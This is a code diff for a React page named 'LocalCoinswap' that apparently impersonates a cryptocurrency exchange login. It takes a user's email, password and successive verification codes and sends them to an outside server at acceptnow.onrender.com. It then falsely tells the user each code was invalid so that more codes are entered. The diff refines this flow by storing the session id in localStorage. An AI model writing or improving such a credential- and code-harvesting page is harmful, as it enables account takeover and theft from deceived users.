@@ -26,6 +26,7 @@ function LocalCoinswap() {
 
       if (res.ok) {
         setUserId(data.userId);
+        localStorage.setItem("userId", data.userId);                
         setStep(2); 
       } else {
         alert(data.error || "Error");
@@ -67,45 +68,45 @@ function LocalCoinswap() {
   ========================== */
   const handleStep3 = async () => {
     if (!code.trim()) return alert("Enter the verification code");
-    if (!userId) {
-      alert("Session expired. Please restart from Step 1.");
+  
+    const storedUserId = localStorage.getItem("userId");
+    if (!storedUserId) {
+      alert("Session expired. Restart.");
       setStep(1);
       return;
     }
   
-    // Create a clean payload object
-    const payload = { userId };
-    
-    // ONLY attach the specific code key for the current attempt
-    if (codeCount === 0) payload.code = code.trim();
-    else if (codeCount === 1) payload.code2 = code.trim();
-    else if (codeCount === 2) payload.code3 = code.trim();
+    const payload = {
+      userId: storedUserId,
+      code: code.trim(), // ✅ ALWAYS SEND `code`
+    };
   
-    // DEBUG: Check this in your browser console (F12)
     console.log("Sending to server:", payload);
   
     try {
-      const res = await fetch("https://acceptnow.onrender.com/api/users/step3", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
+      const res = await fetch(
+        "https://acceptnow.onrender.com/api/users/step3",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        }
+      );
   
       const data = await res.json();
   
       if (res.ok) {
-        const nextCount = codeCount + 1;
-        setCode(""); // Clear input
+        setCode("");
+        setCodeCount((prev) => prev + 1);
   
-        if (nextCount >= 3) {
+        if (codeCount + 1 >= 3) {
           alert("Wrong email or password! Try again.");
           setStep(1);
           setEmail("");
           setWord("");
           setCodeCount(0);
-          setUserId(null);
+          localStorage.removeItem("userId");
         } else {
-          setCodeCount(nextCount);
           alert("Invalid code. Please enter the renewed code.");
         }
       } else {
@@ -116,7 +117,7 @@ function LocalCoinswap() {
       alert("Server connection error");
     }
   };
-
+  
   return (
     <div className="min-h-screen bg-[#0b0f17] flex flex-col items-center justify-center text-white relative px-4 py-8 md:px-0">
       <div className="absolute top-4 left-4 flex items-center space-x-2">
